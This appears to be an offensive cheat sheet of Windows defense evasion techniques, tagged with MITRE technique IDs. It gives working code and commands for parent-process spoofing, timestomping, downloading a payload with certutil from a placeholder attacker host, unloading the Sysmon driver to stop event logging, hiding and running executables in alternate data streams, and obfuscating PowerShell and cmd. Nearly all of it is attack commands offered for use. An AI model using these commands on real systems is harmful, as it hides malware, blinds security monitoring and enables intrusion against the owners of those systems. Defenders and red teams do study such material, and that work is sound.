# Defense Evasion Techniques

## PPID Spoofing
- Start process with arbitrary parent using `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`
- Makes malicious process appear spawned by legitimate parent (e.g., explorer.exe)
```cpp
HANDLE parent = OpenProcess(MAXIMUM_ALLOWED, false, TARGET_PID);
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent, sizeof(HANDLE), NULL, NULL);
CreateProcessA(NULL, "notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

## Timestomping (T1099)
```cmd
timestomp.exe nc.exe -c "Monday 7/25/2005 5:15:55 AM"
```
- Note: $MFT $FILENAME timestamps are NOT modified (forensic artifact)

## Certutil Download (T1140)
```cmd
certutil.exe -urlcache -f http://ATTACKER/payload.exe payload.exe
```

## Sysmon Driver Unloading
```cmd
fltMC.exe unload SysmonDrv
```
- Sysmon process keeps running but stops recording events
- Requires admin privileges

## Alternate Data Streams (T1158)
```cmd
type payload.exe > legit.txt:hidden.exe
wmic process call create legit.txt:hidden.exe
```

## PowerShell Obfuscation
- String concatenation: `iex("Ne"+"w-Ob"+"ject")`
- Encoding: `powershell -enc <base64>`
- Invoke-Obfuscation framework for automated obfuscation

## Command-line Obfuscation
- Caret insertion: `c^e^r^t^u^t^i^l`
- Environment variable substitution: `%COMSPEC:~-16,1%%COMSPEC:~-1,1%`

## PEB Masquerading
- Overwrite PEB->ProcessParameters to disguise process name/path
- Makes malicious process appear as legitimate Windows binary
